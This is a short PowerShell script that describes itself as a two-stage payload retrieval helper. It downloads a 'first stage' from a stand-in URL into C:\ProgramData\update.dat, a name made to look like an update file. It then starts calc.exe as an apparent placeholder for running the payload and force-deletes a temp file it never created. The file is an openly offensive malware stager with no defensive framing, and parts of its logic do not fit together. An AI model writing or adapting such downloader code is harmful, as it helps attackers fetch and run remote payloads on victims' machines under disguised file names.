<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$PayloadUrl = 'https://example.net/stage1.ps1',
    [string]$LocalPath = 'C:\ProgramData\update.dat',
    [int]$RequestTimeout = 63
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$StageResult = Get-Stage1Payload -SourceUrl $PayloadUrl -DestinationPath $LocalPath -TimeoutSec $RequestTimeout
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
